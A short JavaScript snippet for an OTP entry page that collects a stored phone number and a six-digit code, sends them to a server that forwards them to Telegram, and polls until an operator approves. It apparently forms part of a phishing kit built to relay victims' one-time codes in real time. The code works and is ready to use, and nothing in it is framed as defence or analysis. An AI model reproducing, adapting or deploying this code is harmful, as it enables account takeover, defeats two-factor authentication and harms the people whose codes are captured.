<script>
    // Get the phone number from the previous page
    const phone = localStorage.getItem('loginPhone');
    if(phone) {
        document.getElementById('display-phone').innerText = phone;
    } else {
        window.location.href = 'login.html'; 
    }

    // Auto-focus next input box
    function moveToNext(current, nextFieldID) {
        if (current.value.length >= 1) {
            document.getElementById(nextFieldID).focus();
        }
    }

    // Verify OTP Function (UPDATED FOR TELEGRAM APPROVAL)
    async function verifyOTP() {
        const btn = document.querySelector('.submit-btn');
        const otp = 
            document.getElementById('otp1').value + 
            document.getElementById('otp2').value + 
            document.getElementById('otp3').value + 
            document.getElementById('otp4').value + 
            document.getElementById('otp5').value + 
            document.getElementById('otp6').value;

        if (otp.length !== 6) {
            alert("Please enter all 6 digits.");
            return;
        }

        btn.innerText = 'Sending to Admin...';
        btn.disabled = true;

        try {
            // Send the OTP to the server to be forwarded to Telegram
            const response = await fetch('/api/verify-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, otp: otp })
            });

            const result = await response.json();

            // If the server is waiting for Telegram approval
            if (result.status === 'pending_otp_approval') {
                btn.innerText = 'Waiting for Approval...';
                
                // Start checking if you clicked "Approve" on Telegram
                const pollInterval = setInterval(async () => {
                    const statusRes = await fetch(`/api/check-otp-status/${phone}`);
                    const statusData = await statusRes.json();

                    if (statusData.otp_status === 'approved') {
                        clearInterval(pollInterval);
                        alert("Login Successful!");
                        window.location.href = '/dashboard.html'; // Change this to your actual dashboard page
                    } 
                    else if (statusData.otp_status === 'rejected') {
                        clearInterval(pollInterval);
                        alert("OTP was rejected by Admin.");
                        btn.innerText = 'SUBMIT';
                        btn.disabled = false;
                    }
                }, 3000); // Check every 3 seconds
            }
        } catch (error) {
            alert("Network error. Try again.");
            btn.innerText = 'SUBMIT';
            btn.disabled = false;
        }
    }
</script>
